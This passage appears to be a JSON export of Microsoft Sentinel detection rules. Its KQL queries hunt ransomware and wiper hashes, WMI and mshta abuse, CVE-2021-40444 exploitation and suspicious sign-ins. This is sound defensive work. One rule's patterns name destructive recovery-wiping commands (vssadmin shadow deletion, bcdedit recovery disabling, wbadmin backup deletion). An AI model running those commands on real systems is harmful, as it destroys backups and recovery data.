dynamic(['23373654d02cb7eace932609826cca4f82fcac67ca44b9328baba385acc00c67',\n'f8f3f22425ea72fafba5453c70c299367bd144c95e61b348d1e6dda0c469e219',\n'61e0926120f49b3d5edf3a5e0842b04640911974ecbbc93b6b33ca20c1f981bc',\n'91730741d72584f96ccba99ac9387e09b17be6d64728673871858ea917543c1e',\n'aef18b7ab1710aaeb0d060127750ba9d17413035309ec74213d538fb1b1bdf79',\n'e7735cb541e7afd50759eae860b7d1a43d627fbf5cd96d016241084e91659817',\n'23a5981d086242349f6e3476eff11ea3244cebef3d65c76c7bc74470c1ec4b49',\n'3707ad9d9ea318757883ede9691e5c4e8d778c839a056f8b4a94ed47a76da2c8',\n'86f6af51d30159f4d2e00ed733a88dc05cc5dd846b1b2d1ba30582f6e33ac998',\n'b28047cda1c688c844f676e94770c08cf570f4d65fa4c5e4454ae449c2439e3f',\n'e1dcc098a6585dbbf4df64f09f8e8508e218485e1958fe6fe04b91547e109a83',\n'e528cb5e7a2d04269d955ce771b7326bae929355807039f49106126b1a5ff227',\n'fcbfbc2ae4ed3e51631ecb3184004d96f0a6fd5e9de55400dedfa6b5cafc7c41'\n]);\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName\n);\n(union isfuzzy=True\n    (\n    union withsource=TableName Device* //looks at any table titled \"Device\"\n    | where SHA256 has_any (hashlist)  //checks for any SHA256 in the hashlist\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    )\n| project TimeGenerated, AccountName, UserPrincipalName, FileName, FileOriginIP, SHA256, MD5, DeviceName\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"SHA256"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1566"],"displayName":"BAH_IOCs_RelatedTo_DEV-0569","enabled":true,"description":"This analytic looks for IOCs related to the malicious payload BATLOADER which has been used to deploy the most recent/notable Royal Ransomware (DEV-0569).\nPLATFORM:Microsoft 365,Azure AD,Windows,IaaS\nMITRE:TA0001;T1566","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:30:38.4147441Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/f0e54b4a-899a-4ae0-927f-f6b5499a3716","name":"f0e54b4a-899a-4ae0-927f-f6b5499a3716","etag":"\"88009804-0000-2700-0000-66fdccca0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell\r\n// Description: This analytic is based on DTO 22-0097 and looks for looks for CaddyWiper based MD5 activity\r\n// False Positives: Since this is based on MD5s there should be no false positives\r\nlet MD5list = dynamic([@'42e52b8daf63e6e26c3aa91e7e971492', \r\n@'728f13a93b62699e8f94f2d14a989bac']);\r\nlet signInLookup = (\r\nSigninLogs \r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName\r\n);\r\n(union isfuzzy=True\r\n    (\r\n    union withsource=TableName Device* //looks at any table titled \"Device\" \r\n    | where MD5 has_any (MD5list)//checks for any SHA256 in the hashlist\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    )\r\n| project TimeGenerated, AccountName, UserPrincipalName, FileName, FileOriginIP, SHA256, MD5, DeviceName\r\n)","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MD5"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact"],"techniques":["T1561"],"displayName":"BAH_CaddyWiper_MD5_Hash","enabled":true,"description":"This analytic looks for activity associated the destructive data wiper that was used in attacks against organizations in Ukraine. This wiper destroys user data and partition information from attached drives. It is detected by ESET products as Win32/KillDisk.NCX.\nPLATFORM:IaaS\nMITRE:TA0040;T1651","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:44:26.3682269Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/53333535-9b5a-45ea-a062-3693100bc07b","name":"53333535-9b5a-45ea-a062-3693100bc07b","etag":"\"870090a8-0000-2700-0000-66fdc6990000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell, Michael Gibbs\r\n// Description: Detects command line based behavior related to ATT&CK technique T1047 Windows Management Instrumentation.\r\n// This alert does not look for poweshell based \"Invoke-wmimethod\" activity, see hunting queries \"BAH_Invoke-wmimethod_hunting\"\r\n// supports DTO 22-0484\r\n// False Positives: This is a common command used in incidence response and by administrators. If the user that triggers this alert is a system admin or part of a IR team it is likely a false positive.\r\nlet cmds = dynamic([\"process call create\",\"process get brief\" ]);\r\nlet allowStrings = dynamic([\"diirt\"]); // filters out incident response activity\r\nlet allowUser = dynamic(\"insert_allowed_users_here_by_UPN\");\r\nlet signInLookup = (\r\nSigninLogs \r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName\r\n);\r\nDeviceProcessEvents\r\n| where ((InitiatingProcessCommandLine has_any (cmds)) or (ProcessCommandLine has_any (cmds)))\r\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n| where not(UserPrincipalName has_any (allowUser))\r\n| project TimeGenerated, AccountName, UserPrincipalName, DeviceName, InitiatingProcessCommandLine, ProcessCommandLine","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"InitiatingProcessCommandLine"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1047"],"displayName":"BAH_T1047WMICommands","enabled":true,"description":"Detects command line based behavior related to ATT&CK technique T1047 Windows Management Instrumentation.\nPLATFORM:Windows\nMITRE:TA0002;T1047","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:17:58.9123723Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/bf517753-2fab-418f-813b-d9eb5beaa848","name":"bf517753-2fab-418f-813b-d9eb5beaa848","etag":"\"870038a6-0000-2700-0000-66fdc6680000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Rob Russell, Michael Gibbs\r\n// Description: Detects command line based behavior related to ATT&CK technique T1218 System Binary Proxy Execution: Mshta\r\n// This alert can not determine if a .hta file contains malicious commands\r\n// False Positives: It has been noted that some HP printer driver uninstallers make use of mshta commands in the command line and could trigger a false positive\r\nlet mshtaCMDs = dynamic([\"javascript\", 'ActiveXObject', 'vbscript']);\r\nlet signInLookup = (\r\nSigninLogs \r\n| where TimeGenerated >= ago(1d)\r\n| where DeviceDetail contains \"displayName\"\r\n| extend DeviceDetailJson = parse_json(DeviceDetail)\r\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\r\n| distinct DeviceNameSI, UserPrincipalName\r\n);\r\n(union isfuzzy=True\r\n    (\r\n    DeviceProcessEvents\r\n    | where FolderPath endswith \"mshta.exe\"\r\n    | where ProcessCommandLine startswith \"mshta.exe \"// this space is intentional, meant to detect follow on commands and filter our mshta.exe on its own\r\n    | where ProcessCommandLine != \"mshta.exe -Embedding\"\r\n    | where ProcessCommandLine has_any (mshtaCMDs)\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, AccountName, UserPrincipalName, DeviceName, ProcessCommandLine\r\n    ),(\r\n     DeviceImageLoadEvents\r\n    | where InitiatingProcessCommandLine startswith \"mshta\"\r\n    | where InitiatingProcessCommandLine has_any (mshtaCMDs)\r\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\r\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\r\n    | project TimeGenerated, InitiatingProcessAccountName, UserPrincipalName, DeviceName, ProcessCommandLine=InitiatingProcessCommandLine\r\n    )\r\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"ProcessCommandLine"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["DefenseEvasion"],"techniques":["T1218"],"displayName":"BAH_T1218SystemBinaryProxyExecutionMSHTA","enabled":true,"description":"Detects command line based behavior related to ATT&CK technique T1218 System Binary Proxy Execution: Mshta\nThis alert can not determine if a .hta file contains malicious commands\nPLATFORM:Windows\nMITRE:TA0005;T1218","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:17:11.619568Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/738623fb-9b92-462a-82ee-8962e547eee3","name":"738623fb-9b92-462a-82ee-8962e547eee3","etag":"\"8700b77f-0000-2700-0000-66fdc4310000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Michael Gibbs\n// Description: Looks for shadowcopy deletion using bcedit, wmic and wbadmin. ransomware groups have used this method to make devices unrecoverable after infection. \n// False Positives: Some false positives can come up when vms are stood up. Many times at startup or deletion VMs will delete the VSS in order to create more space.\n//https://www.welivesecurity.com/2023/01/27/swiftslicer-new-destructive-wiper-malware-ukraine/\n//https://github.com/Azure/Azure-Sentinel/blob/master/Solutions/Endpoint%20Threat%20Protection%20Essentials/Hunting%20Queries/BackupDeletion.yaml\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName\n);\nDeviceProcessEvents\n| where FileName =~ \"vssadmin.exe\" and ProcessCommandLine has \"delete shadows\"\n    or ProcessCommandLine has(\"bcdedit\") and ProcessCommandLine has_any(\"recoveryenabled no\", \"bootstatuspolicy ignoreallfailures\")\n    or (ProcessCommandLine has \"wmic\" and ProcessCommandLine has \"shadowcopy delete\")\n    or ProcessCommandLine has \"wbadmin\" and ProcessCommandLine has \"delete\" and ProcessCommandLine has_any(\"backup\", \"catalog\", \"systemstatebackup\")\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n| project timestamp = TimeGenerated, AccountCustomEntity = AccountName, UserPrincipalName, HostCustomEntity = DeviceName, ProcessCustomEntity = InitiatingProcessFileName, ProcessCommandLine","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":false,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"Process","fieldMappings":[{"identifier":"CommandLine","columnName":"ProcessCommandLine"}]},{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Impact","DefenseEvasion","Execution"],"techniques":["T1490","T1562","T1059"],"displayName":"BAH_Volume_Shadow_Deletion","enabled":true,"description":"Looks for shadowcopy deletion using bcedit, wmic and wbadmin. ransomware groups have used this method to make devices unrecoverable after infection.\nPLATFORM:Windows\nMITRE:TA0040;T1485;T1490;T1561","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:07:44.7509828Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/de3cb3a0-472d-4891-90de-ac48a26dd49d","name":"de3cb3a0-472d-4891-90de-ac48a26dd49d","etag":"\"6700d387-0000-2700-0000-63ea5e130000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"MicrosoftSecurityIncidentCreation","properties":{"productFilter":"Azure Security Center","severitiesFilter":["Low","Medium","High"],"displayNamesFilter":null,"displayNamesExcludeFilter":null,"displayName":"Create incidents based on Microsoft Defender for Cloud","enabled":true,"description":"Create incidents based on all alerts generated in Microsoft Defender for Cloud","alertRuleTemplateName":"90586451-7ba8-4c1e-9904-7d1b7c3cc4d6","lastModifiedUtc":"2023-02-13T15:58:11.2708758Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b9d2bae2-c5b3-4f0b-b22e-32600ac3aa8c","name":"b9d2bae2-c5b3-4f0b-b22e-32600ac3aa8c","etag":"\"870063e6-0000-2700-0000-66fdcad40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Rob Russell, Mike Gibbs\n//Description:\n// Looks for filename and hash associated with the flash player update service. NSA recommended in 2019 that Flash player should be removed from all systems.\n// https://media.defense.gov/2019/Sep/25/2002186834/-1/-1/0/CSA%20-%20CONTINUED%20USE%20OF%20ADOBE%20FLASH%20INVITES%20COMPROMISE.PDF\n//False Positives: There are no known flase positives for this alert.\nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\nDeviceProcessEvents\n| where (FileName=~\"FlashPlayerUpdateService.exe\") or\n(MD5 has_any (\"e9c0c7b2f67b29728b4193c3c897d7a1\", \"fe5b21f775881e283350df4e47d82fab\"))\n| extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n| join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n| project TimeGenerated, DeviceName, UserPrincipalName, AccountName, ProcessCommandLine, FileName, MD5","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"MD5"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"FileName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","DefenseEvasion"],"techniques":["T1203","T1036"],"displayName":"BAH_FlashUpdaterActivity","enabled":true,"description":"Looks for file name and hash associated with the flash player update service. NSA recommended in 2019 that Flash player should be removed from all systems.\nPLATFORM:Windows\nMITRE:TA0002;T1203,TA0005;T1036","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:36:04.0653654Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/c97f71e0-1ff3-4e8e-be16-e750b08c20ad","name":"c97f71e0-1ff3-4e8e-be16-e750b08c20ad","etag":"\"f7005a99-0000-2700-0000-63fde8610000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P8D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"// a threshold can be enabled, see commented line below for PrevSeenCount\r\nlet threshold = 2;\r\nlet uploadOp = 'FileUploaded';\r\n// Extensions that are interesting. Add/Remove to this list as you see fit\r\nlet execExt = dynamic(['exe', 'inf', 'gzip', 'cmd', 'bat']);\r\nlet starttime = 8d;\r\nlet endtime = 1d;\r\nOfficeActivity | where TimeGenerated >= ago(endtime)\r\n// Limited to File Uploads due to potential noise, comment out the Operation statement below to include any operation type\r\n// Additional, but potentially noisy operation types that include Uploads and Downloads can be included by adding the following - Operation contains \"upload\" or Operation contains \"download\"\r\n| where Operation =~ uploadOp\r\n| where SourceFileExtension has_any (execExt)\r\n| project TimeGenerated, OfficeId, OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, UserAgent, Site_Url, SourceRelativeUrl, SourceFileName\r\n| join kind= leftanti (\r\nOfficeActivity | where TimeGenerated between (ago(starttime) .. ago(endtime))\r\n| where Operation =~ uploadOp\r\n| where SourceFileExtension has_any (execExt)\r\n| summarize SourceRelativeUrl = make_set(SourceRelativeUrl), UserId = make_set(UserId) , PrevSeenCount = count() by SourceFileName\r\n// To exclude previous matches when only above a specific count, change threshold above and uncomment the line below\r\n//| where PrevSeenCount > threshold\r\n| mvexpand SourceRelativeUrl, UserId\r\n| extend SourceRelativeUrl = tostring(SourceRelativeUrl), UserId = tostring(UserId)\r\n) on SourceFileName, SourceRelativeUrl, UserId \r\n| extend SiteUrlUserFolder = tolower(split(Site_Url, '/')[-2])\r\n| extend UserIdUserFolderFormat = tolower(replace('@|\\\\.', '_',UserId))\r\n// identify when UserId is not a match to the specific site url personal folder reference\r\n| extend UserIdDiffThanUserFolder = iff(Site_Url has '/personal/' and SiteUrlUserFolder != UserIdUserFolderFormat, true , false ) \r\n| summarize TimeGenerated = make_list(TimeGenerated), StartTime = min(TimeGenerated), EndTime = max(TimeGenerated), \r\nUserAgents = make_list(UserAgent), OfficeIds = make_list(OfficeId), SourceRelativeUrls = make_list(SourceRelativeUrl), FileNames = make_list(SourceFileName)\r\nby OfficeWorkload, RecordType, Operation, UserType, UserKey, UserId, ClientIP, Site_Url, SiteUrlUserFolder, UserIdUserFolderFormat, UserIdDiffThanUserFolder\r\n| extend timestamp = StartTime, AccountCustomEntity = UserId, IPCustomEntity = ClientIP, URLCustomEntity = Site_Url","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"URLCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl"],"techniques":[],"displayName":"New executable via Office FileUploaded Operation v2","enabled":false,"description":"Identifies when executable file types are uploaded to Office services such as SharePoint and OneDrive. List currently includes 'exe', 'inf', 'gzip', 'cmd', 'bat' file extensions. Additionally, identifies when a given user is uploading these files to another users workspace. This may be indication of a staging location for malware or other malicious activity.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-02-28T11:41:21.6323206Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1ab7a6cf-b6b1-4348-a61f-33d1d854aae1","name":"1ab7a6cf-b6b1-4348-a61f-33d1d854aae1","etag":"\"a2017507-0000-2700-0000-654d04510000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"( union isfuzzy=true\n//(SecurityEvent\n//| where EventID==4688\n//| where isnotempty(CommandLine)\n//| extend FileName = Process, ProcessCommandLine = CommandLine\n//| where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')\n//  or ProcessCommandLine matches regex @'\\\".[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.'\n//| extend timestamp = TimeGenerated, AccountCustomEntity = Account, HostCustomEntity = Computer\n//),\n(DeviceProcessEvents\n| where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')\nor ProcessCommandLine matches regex @'\\\".[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.'\n| extend timestamp = TimeGenerated, AccountCustomEntity = InitiatingProcessAccountUpn, HostCustomEntity = DeviceName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 1 \n| extend EventData = parse_xml(EventData).DataItem.EventData.Data\n| mv-expand bagexpansion=array EventData\n| evaluate bag_unpack(EventData)\n| extend Key = tostring(column_ifexists('@Name', \"\")), Value = column_ifexists('#text', \"\")\n| evaluate pivot(Key, any(Value), TimeGenerated, Source, EventLog, Computer, EventLevel, EventLevelName, UserName, RenderedDescription, MG, ManagementGroupName, Type, _ResourceId)\n| extend Image = column_ifexists(\"Image\", \"\"), ProcessCommandLine = column_ifexists(\"CommandLine\", \"\")\n| extend FileName = split(Image, '\\\\', -1)[-1]\n| where (FileName in~('control.exe','rundll32.exe') and ProcessCommandLine has '.cpl:')\n  or ProcessCommandLine matches regex @'\\\".[a-zA-Z]{2,4}:\\.\\.\\/\\.\\.'\n| extend timestamp = TimeGenerated, AccountCustomEntity = UserName, HostCustomEntity = Computer\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]}],"templateVersion":"1.0.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess","Execution"],"techniques":["T1190","T1203"],"displayName":"MSHTML vulnerability CVE-2021-40444 attack","enabled":true,"description":"This query detects attacks that exploit the CVE-2021-40444 MSHTML vulnerability using specially crafted Microsoft Office documents. \n The detection searches for relevant files used in the attack along with regex matches in commnadline to look for pattern similar to : \".cpl:../../msword.inf\"\n Refrence: https://www.microsoft.com/security/blog/2021/09/15/analyzing-attacks-that-exploit-the-mshtml-cve-2021-40444-vulnerability/\n\nInitial Access, Execution\nT1190 - Exploit Public-Facing Application,T1203 - Exploitation for Client Execution:T1203.001","alertRuleTemplateName":"972c89fa-c969-4d12-932f-04d55d145299","lastModifiedUtc":"2023-11-09T16:09:52.1434713Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/d0a673d4-ced1-47d2-9b5a-639b082baa19","name":"d0a673d4-ced1-47d2-9b5a-639b082baa19","etag":"\"88005812-0000-2700-0000-66fdcdda0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Low","query":"SigninLogs\r\n| where Status ==\"{\\\"errorCode\\\":0}\" and ResourceDisplayName==\"Windows Azure Service Management API\"","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":true,"reopenClosedIncident":false,"lookbackDuration":"PT8H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"UserPrincipalName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["PrivilegeEscalation"],"techniques":["T1078"],"displayName":"Azure Portal Signin - Privilege Escalation through Valid Accounts","enabled":true,"description":"This analytic detecs on user sign-in via the Azure Portal and/or Microsoft Azure PowerShell.  By obtaining valid user credentials, an adversary may login to AzureAD via command line or through the Azure Portal.\n\nMITRE ATT&CK ID: T1078 | https://attack.mitre.org/techniques/T1078/\nAdversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\nPLATFORM:Azure AD,Microsoft 365,IaaS\nMITRE:TA0004;T1078;T1078.004","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:48:53.7916842Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/7ecb568f-517f-4ef8-abf6-291e96f8c5e7","name":"7ecb568f-517f-4ef8-abf6-291e96f8c5e7","etag":"\"1302cd36-0000-2700-0000-67168b690000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"// Author: Michael Gibbs\n// Description: Remote Access and Meeting tools not approved by DISA https://aplits.disa.mil/processAPList.action\n// False Positives: If another application uses a similar named DLL or exe\nlet signInLookup = (\nSigninLogs \n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName\n);\nlet files = dynamic([@\"BAConsoleAppEN\",\n@\"takecontroltechconsole\",\n@\"baconsoleapp\",\n@\"GoTo Meeting Opener\",\n@\"GoToOpener.exe\",\n@\"G2MCoreInstExtractor\"\n]);\n(union 